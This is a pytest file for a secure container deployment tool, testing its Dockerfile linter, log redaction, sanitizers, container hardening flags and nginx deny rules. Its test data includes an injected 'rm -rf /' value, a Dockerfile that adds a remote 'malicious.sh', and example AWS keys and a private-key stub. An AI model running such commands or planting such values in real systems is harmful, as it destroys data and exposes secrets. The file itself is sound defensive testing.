from collections import Counter
from datetime import datetime, timezone
import os
from pathlib import Path
import shutil
import sys
import tempfile
from unittest.mock import MagicMock, patch

BACKEND_DIR = Path(__file__).resolve().parent.parent / "backend"
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from api.deployments import sanitize_logs
from db import Base, DeploymentRecord, ScanRecord, allocate_next_port, engine, get_db, init_db
from deployer.docker_build import (
    DOCKERIGNORE_CONTENT,
    detect_stack,
    generate_dockerfile,
    lint_dockerfile,
    sanitize_identifier,
)
from deployer.ec2 import EC2Deployer
from deployer.local import LocalDockerDeployer
from fastapi.testclient import TestClient
from main import app
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

TestSession = sessionmaker(autocommit=False, autoflush=False, bind=engine)


def test_lint_dockerfile_passes_hardened():
    """Hardened Dockerfile with non-root USER and versioned tags yields no high findings."""
    with tempfile.NamedTemporaryFile("w+", suffix="Dockerfile", delete=False) as f:
        f.write("""FROM node:20-alpine
WORKDIR /app
COPY . .
USER appuser
EXPOSE 3000
CMD ["npm", "start"]
""")
        f_path = f.name
    try:
        findings = lint_dockerfile(f_path)
        highs = [f for f in findings if f.severity in ("high", "critical")]
        assert len(highs) == 0, f"Expected 0 high findings, got {highs}"
    finally:
        os.remove(f_path)


def test_lint_dockerfile_blocks_root_user():
    """Flags lack of USER instruction or explicit root."""
    with tempfile.NamedTemporaryFile("w+", suffix="Dockerfile", delete=False) as f:
        f.write("""FROM python:3.11-slim
WORKDIR /app
COPY . .
CMD ["python", "main.py"]
""")
        f_path = f.name
    try:
        findings = lint_dockerfile(f_path)
        assert any(f.type == "docker_no_user_instruction" and f.severity == "medium" for f in findings)
    finally:
        os.remove(f_path)


def test_lint_dockerfile_blocks_secrets_in_env_or_arg():
    """Flags secrets embedded in ENV or ARG as high severity."""
    with tempfile.NamedTemporaryFile("w+", suffix="Dockerfile", delete=False) as f:
        f.write("""FROM python:3.11-slim
ENV AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
USER appuser
CMD ["python", "main.py"]
""")
        f_path = f.name
    try:
        findings = lint_dockerfile(f_path)
        highs = [f for f in findings if f.type == "docker_embedded_secret"]
        assert len(highs) == 1
        assert highs[0].severity == "high"
    finally:
        os.remove(f_path)


def test_lint_dockerfile_blocks_remote_add_and_ssh_expose():
    """Flags ADD remote URL, EXPOSE 22 (SSH), and latest tag."""
    with tempfile.NamedTemporaryFile("w+", suffix="Dockerfile", delete=False) as f:
        f.write("""FROM ubuntu:latest
ADD https://example.com/malicious.sh /tmp/
EXPOSE 22
USER appuser
CMD ["bash"]
""")
        f_path = f.name
    try:
        findings = lint_dockerfile(f_path)
        assert any(f.type == "docker_remote_add" for f in findings)
        assert any(f.type == "docker_expose_ssh" and f.severity == "high" for f in findings)
        assert any(f.type == "docker_latest_tag" for f in findings)
    finally:
        os.remove(f_path)


def test_stack_detection_and_safe_dockerfile_generation():
    """Detects static, Node, and Python stacks and creates non-root Dockerfiles with .dockerignore."""
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        # Static
        (root / "index.html").write_text("<h1>Hello</h1>")
        assert detect_stack(str(root)) == "static"
        static_docker = generate_dockerfile(str(root))
        assert "USER nginx" in static_docker

        (root / "index.html").unlink()

        # Node
        (root / "package.json").write_text('{"name":"test"}')
        assert detect_stack(str(root)) == "node"
        node_docker = generate_dockerfile(str(root))
        assert "USER appuser" in node_docker
        (root / "package.json").unlink()

        # Python
        (root / "requirements.txt").write_text("fastapi")
        assert detect_stack(str(root)) == "python"
        py_docker = generate_dockerfile(str(root))
        assert "USER appuser" in py_docker

    assert ".env" in DOCKERIGNORE_CONTENT
    assert "id_rsa" in DOCKERIGNORE_CONTENT
    assert "*.pem" in DOCKERIGNORE_CONTENT


def test_unknown_stack_fails_with_clear_message():
    """Unknown stack fails with a clear ValueError message."""
    with tempfile.TemporaryDirectory() as tmpdir:
        assert detect_stack(tmpdir) == "unknown"
        try:
            generate_dockerfile(tmpdir)
            assert False, "Should raise ValueError for unknown stack"
        except ValueError as exc:
            assert "Unknown stack" in str(exc)


def test_identifier_sanitizer():
    """Ensures Docker image tags and container names contain only safe characters."""
    assert sanitize_identifier("my-App:v1.0") == "my-app-v1.0"
    assert sanitize_identifier("evil; rm -rf /") == "evil-rm-rf"
    assert sanitize_identifier("---leading-dash") == "leading-dash"


def test_blocked_scan_cannot_deploy_rule():
    """HARD RULE: Blocked scan cannot deploy and returns 409 Conflict via API endpoint."""
    init_db()
    db = TestSession()
    try:
        blocked_scan = ScanRecord(
            source="tests/sample-repos/leaky-app",
            status="blocked",
            risk_score=85,
            risk_level="high",
            blocked_reason="Blocked: AWS access key found",
            created_at=datetime.now(timezone.utc),
        )
        db.add(blocked_scan)
        db.commit()
        db.refresh(blocked_scan)
        scan_id = blocked_scan.id

        client = TestClient(app)
        resp = client.post(f"/api/scans/{scan_id}/deploy")
        assert resp.status_code == 409
        assert "Only scans with status 'passed' can be deployed" in resp.json()["detail"]
    finally:
        db.close()


def test_port_allocation_no_collisions():
    """Port allocator returns unique ports in range 9000-9999."""
    mem_engine = create_engine("sqlite://", poolclass=StaticPool, connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=mem_engine)
    MemSession = sessionmaker(autocommit=False, autoflush=False, bind=mem_engine)
    db = MemSession()
    try:
        p1 = allocate_next_port(db, min_port=9000, max_port=9005)
        assert 9000 <= p1 <= 9005

        d1 = DeploymentRecord(
            scan_id=1,
            status="deployed",
            image_tag="tag1",
            container_name="c1",
            port=p1,
            url=f"http://127.0.0.1:{p1}",
            host_type="local",
            logs="",
        )
        db.add(d1)
        db.commit()

        p2 = allocate_next_port(db, min_port=9000, max_port=9005)
        assert p2 != p1
        assert 9000 <= p2 <= 9005
    finally:
        db.close()


def test_container_run_command_contains_all_hardening_flags():
    """Container run command strictly includes all security flags required by Task 3."""
    deployer = LocalDockerDeployer()
    with patch("subprocess.run") as mock_run:
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "container_id_123"
        mock_proc.stderr = ""
        mock_run.return_value = mock_proc

        deployer.run("securedeploy/scan-1:abc", "securedeploy-scan-1-abc", 9020)

        # Inspect docker run command arguments
        called_cmd = mock_run.call_args[0][0]
        assert called_cmd[0] == "docker"
        assert called_cmd[1] == "run"
        assert "--read-only" in called_cmd
        assert "--tmpfs" in called_cmd and "/tmp" in called_cmd
        assert "--memory" in called_cmd and "256m" in called_cmd
        assert "--cpus" in called_cmd and "0.5" in called_cmd
        assert "--pids-limit" in called_cmd and "100" in called_cmd
        assert "--cap-drop" in called_cmd and "ALL" in called_cmd
        assert "--security-opt" in called_cmd and "no-new-privileges" in called_cmd
        assert "--restart" in called_cmd and "unless-stopped" in called_cmd
        assert "-p" in called_cmd and "127.0.0.1:9020:80" in called_cmd
        assert "--network" in called_cmd and "secure-deploy-net" in called_cmd


def test_logs_never_contain_env_values():
    """Sanitizer masks sensitive tokens, private keys, and environment variables."""
    raw_logs = (
        "Building image with AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        "DATABASE_URL=postgres://admin:superSecret123@db.internal:5432/prod\n"
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----\n"
        "Clean compilation finished successfully."
    )
    cleaned = sanitize_logs(raw_logs)
    assert "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" not in cleaned
    assert "superSecret123" not in cleaned
    assert "-----BEGIN RSA PRIVATE KEY-----" not in cleaned
    assert "[REDACTED_SECRET]" in cleaned
    assert "[REDACTED_PRIVATE_KEY]" in cleaned
    assert "Clean compilation finished successfully." in cleaned


def test_re_scan_before_build_aborts_tampered_files():
    """If approved source files are tampered with before build, deploy aborts."""
    init_db()
    db = TestSession()
    configured_ws = Path(tempfile.mkdtemp())
    try:
        scan = ScanRecord(
            source="tests/sample-repos/clean-app",
            status="passed",
            risk_score=0,
            risk_level="low",
            created_at=datetime.now(timezone.utc),
        )
        db.add(scan)
        db.commit()
        scan_id = scan.id

        approved_dir = configured_ws / "approved" / str(scan_id)
        approved_dir.mkdir(parents=True, exist_ok=True)
        # Inject dirty secret into approved directory
        (approved_dir / "leak.js").write_text('const k = "AKIAIOSFODNN7EXAMPLE";')

        dep = DeploymentRecord(
            scan_id=scan_id,
            status="pending",
            image_tag="securedeploy/scan-test:123",
            container_name="securedeploy-scan-test-123",
            port=9010,
            url="http://127.0.0.1:9010",
            host_type="local",
            logs="",
        )
        db.add(dep)
        db.commit()

        from api.deployments import execute_deployment_task
        execute_deployment_task(dep.id, str(approved_dir))

        db.refresh(dep)
        assert dep.status == "failed"
        assert "project is no longer clean" in dep.logs
    finally:
        db.close()
        shutil.rmtree(configured_ws, ignore_errors=True)


def test_ec2_deployer_mocked_ssh():
    """EC2 deployer mocks Paramiko SSH connection and runs commands without network."""
    deployer = EC2Deployer(host="192.0.2.1", user="ubuntu", key_path="/dummy/key.pem")

    mock_client = MagicMock()
    mock_sftp = MagicMock()
    mock_client.open_sftp.return_value = mock_sftp

    mock_stdout = MagicMock()
    mock_stdout.read.return_value = b"Loaded image"
    mock_stderr = MagicMock()
    mock_stderr.read.return_value = b""
    mock_client.exec_command.return_value = (None, mock_stdout, mock_stderr)

    with patch.object(deployer, "_get_ssh_client", return_value=mock_client), \
         patch("subprocess.Popen") as mock_popen:
        mock_process = MagicMock()
        mock_process.stdout.read.side_effect = [b"tar_content", b""]
        mock_process.wait.return_value = 0
        mock_popen.return_value = mock_process

        out = deployer.run("securedeploy/scan-1:v1", "securedeploy-c1", 9005)
        assert "Loaded image" in out
        mock_sftp.put.assert_called_once()
        assert mock_client.exec_command.call_count >= 1


def test_nginx_config_contains_deny_rules():
    """Verify hardened Nginx default.conf and snippets/security.conf contain required deny rules."""
    project_root = Path(__file__).resolve().parent.parent
    default_conf_path = project_root / "nginx" / "default.conf"
    security_conf_path = project_root / "nginx" / "snippets" / "security.conf"

    assert default_conf_path.exists(), "nginx/default.conf must exist"
    assert security_conf_path.exists(), "nginx/snippets/security.conf must exist"

    default_conf = default_conf_path.read_text(encoding="utf-8")
    security_conf = security_conf_path.read_text(encoding="utf-8")

    # Dotfiles denied (404) with ACME challenge allowed
    assert r"location ~ /\.(?!well-known\/acme-challenge)" in security_conf
    assert "return 404;" in security_conf

    # Sensitive files and extensions denied with 404
    unescaped_security_conf = security_conf.replace(r"\.", ".")
    for ext in ["env", "git", "pem", "key", "tfstate", "Dockerfile", "package.json"]:
        assert ext in unescaped_security_conf

    # Security headers
    assert "server_tokens off;" in security_conf
    assert 'add_header X-Frame-Options "DENY"' in security_conf
    assert 'add_header X-Content-Type-Options "nosniff"' in security_conf
    assert 'add_header Referrer-Policy "no-referrer"' in security_conf
    assert "add_header Content-Security-Policy" in security_conf

    # HTTPS block in default.conf
    assert "listen 443 ssl" in default_conf
    assert "Strict-Transport-Security" in default_conf
    assert "limit_req_zone" in default_conf
    assert "client_max_body_size 1m;" in default_conf
    assert "return 301 https://$host$request_uri;" in default_conf


if __name__ == "__main__":
    test_lint_dockerfile_passes_hardened()
    test_lint_dockerfile_blocks_root_user()
    test_lint_dockerfile_blocks_secrets_in_env_or_arg()
    test_lint_dockerfile_blocks_remote_add_and_ssh_expose()
    test_stack_detection_and_safe_dockerfile_generation()
    test_unknown_stack_fails_with_clear_message()
    test_identifier_sanitizer()
    test_blocked_scan_cannot_deploy_rule()
    test_port_allocation_no_collisions()
    test_container_run_command_contains_all_hardening_flags()
    test_logs_never_contain_env_values()
    test_re_scan_before_build_aborts_tampered_files()
    test_ec2_deployer_mocked_ssh()
    test_nginx_config_contains_deny_rules()
    print("ALL 14 test_day4.py checks PASSED successfully!")
